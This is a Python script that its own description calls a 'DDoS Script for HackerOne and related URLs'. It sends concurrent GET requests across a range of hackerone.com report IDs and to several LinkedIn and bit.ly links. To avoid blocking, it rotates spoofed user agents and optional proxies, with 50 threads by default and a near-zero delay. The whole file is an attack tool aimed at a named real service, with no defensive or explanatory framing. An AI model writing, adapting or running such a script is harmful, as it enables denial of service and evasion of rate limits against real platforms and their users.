import requests
import concurrent.futures
import random
import argparse
import time

# List of user agents for rotation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1",
    "Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
]

# List of additional URLs for requests
additional_urls = [
    "https://bit.ly/3Kcfv4p",
    "https://bit.ly/4dEvyVf",
    "https://www.linkedin.com/company/hackerone/",
    "https://www.linkedin.com/posts/hackerone_leadershipdevelopment-hackeronelife-leaders-activity-7229171108879491073-W7b5?utm_source=share&utm_medium=member_android"
]

# Function to make a GET request
def make_request(url, proxies=None):
    headers = {'User-Agent': random.choice(user_agents)}
    proxy = random.choice(proxies) if proxies else None
    try:
        response = requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None)
        print(f"Requested URL: {url}, Status Code: {response.status_code}, Proxy: {proxy}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed for URL: {url}, Error: {e}")

# Function to handle the range of report URLs
def request_reports(base_url, start_report_id, end_report_id, proxies=None):
    for report_id in range(start_report_id, end_report_id + 1):
        url = f"{base_url}{report_id:07d}"  # Format with leading zeros
        make_request(url, proxies)

# Function to handle additional URLs
def request_additional_urls(proxies=None):
    for url in additional_urls:
        make_request(url, proxies)

# Main execution function using threading for concurrent requests
def main(start_report_id, end_report_id, concurrency, delay, proxies):
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
        # Submit tasks for report URLs
        executor.submit(request_reports, "https://hackerone.com/reports/", start_report_id, end_report_id, proxies)
        # Submit tasks for additional URLs
        executor.submit(request_additional_urls, proxies)
        # Introduce delay
        time.sleep(delay)

# Argument parser for command line usage
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Script for HackerOne and related URLs")
    parser.add_argument("--start", type=int, required=True, help="Starting report ID")
    parser.add_argument("--end", type=int, required=True, help="Ending report ID")
    parser.add_argument("--concurrency", type=int, default=50, help="Number of concurrent threads")
    parser.add_argument("--delay", type=float, default=0.00001, help="Delay between requests")
    parser.add_argument("--proxies", type=str, help="Path to proxy list file")

    args = parser.parse_args()

    # Load proxies if provided
    proxy_list = None
    if args.proxies:
        with open(args.proxies, 'r') as f:
            proxy_list = [line.strip() for line in f.readlines()]

    # Run the main function
    main(args.start, args.end, args.concurrency, args.delay, proxy_list)
